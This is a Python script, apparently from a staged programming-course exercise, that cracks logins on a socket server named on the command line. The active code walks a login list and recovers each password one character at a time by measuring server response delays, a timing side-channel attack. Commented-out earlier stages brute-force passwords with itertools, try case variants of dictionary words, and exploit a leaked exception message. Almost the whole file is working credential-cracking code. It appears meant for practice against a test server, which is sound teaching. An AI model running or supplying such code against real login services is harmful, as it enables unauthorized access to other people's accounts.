import socket
import sys
import itertools
import json
from datetime import datetime


def generate_login(file):
    while True:
        for line in file:
            yield line[:-1]


def create_json_request(user_login, user_password=' '):
    json_request = {"login": user_login, "password": user_password}
    return json.dumps(json_request)


def generate_password_item():
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    alphabet = list(alphabet)
    while True:
        for item in alphabet:
            yield item


def get_response(json_message):
    my_socket.send(json_message.encode())
    response = my_socket.recv(1024)
    return json.loads(response.decode())


for_socket = sys.argv
with socket.socket() as my_socket:
    hostname = str(for_socket[1])
    port = int(for_socket[2])
    address = (hostname, port)
    my_socket.connect(address)

    with open('.\logins.txt', 'r') as file:
        login_generator = generate_login(file)
        for login in login_generator:
            json_message = create_json_request(login)

            decoded_response = get_response(json_message)

            if decoded_response['result'] == "Wrong password!":
                i = 0
                password_list = [' ']
                while decoded_response['result'] != "Connection success!":
                    password_item = generate_password_item()
                    for item in password_item:
                        password_list[i] = item
                        password = ''.join([str(elem) for elem in password_list])
                        start = datetime.now()
                        json_message = create_json_request(login, password)
                        decoded_response = get_response(json_message)
                        finish = datetime.now()
                        difference = finish - start
                        difference = (int(difference.total_seconds() * 1000))

                        if difference > 60:
                            i += 1
                            password_list.append(' ')

                        if decoded_response['result'] == "Connection success!":
                            print(json_message)
                            break
                    break
                break


my_socket.close()


# stage 3 implementation

#
# import socket
# import sys
# import itertools

# second Stage function

# def password_generator():
#     alphabet = 'abcdefghijklmnopqrstuvwxyz0123456789'
#     i = 1
#     while True:
#         for password in itertools.product(alphabet, repeat=i):
#             yield ''.join(password)
#         i += 1
#
# def second_password_generator(file):
#     while True:
#         for line in file:
#             line = line[:-1]
#             variant = map(lambda x: ''.join(x), itertools.product(*([letter.lower(), letter.upper()] for letter in line)))
#             for item in list(variant):
#                 yield item
#
#
# for_socket = sys.argv
# with socket.socket() as my_socket:
#     hostname = str(for_socket[1])
#     port = int(for_socket[2])
#     address = (hostname, port)
#     my_socket.connect(address)
#
#     with open('.\\passwords.txt', 'r') as file:
#         pass_generator = second_password_generator(file)
#         for password in pass_generator:
#             my_socket.send(password.encode())
#             response = my_socket.recv(1024)
#             if response.decode() == 'Connection success!':
#                 print(password)
#                 file.close()
#                 break
#
# my_socket.close()


# stage 4 implementation

# import socket
# import sys
# import itertools
# import json
#
#
# def generate_login(file):
#     while True:
#         for line in file:
#             yield line[:-1]
#
#
# def create_json_request(user_login, user_password=' '):
#     json_request = {"login": user_login, "password": user_password}
#     return json.dumps(json_request)
#
#
# def generate_password_item():
#     alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
#     alphabet = list(alphabet)
#     while True:
#         for item in alphabet:
#             yield item
#
#
# def get_response(json_message):
#     my_socket.send(json_message.encode())
#     response = my_socket.recv(1024)
#     return json.loads(response.decode())
#
#
# counter = 0
# for_socket = sys.argv
# with socket.socket() as my_socket:
#     hostname = str(for_socket[1])
#     port = int(for_socket[2])
#     address = (hostname, port)
#     my_socket.connect(address)
#
#     with open('.\logins.txt', 'r') as file:
#         login_generator = generate_login(file)
#         for login in login_generator:
#             json_message = create_json_request(login)
#
#             decoded_response = get_response(json_message)
#             counter += 1
#
#             if decoded_response['result'] == "Wrong password!":
#                 i = 0
#                 password_list = [' ']
#                 while decoded_response['result'] != "Connection success!":
#                     password_item = generate_password_item()
#                     for item in password_item:
#                         password_list[i] = item
#                         password = ''.join([str(elem) for elem in password_list])
#                         json_message = create_json_request(login, password)
#                         decoded_response = get_response(json_message)
#                         counter += 1
#
#                         if decoded_response['result'] == "Exception happened during login":
#                             i += 1
#                             password_list.append(' ')
#
#                         if decoded_response['result'] == "Connection success!":
#                             print(json_message)
#                             break
#                     break
#                 break
#
#
# my_socket.close()

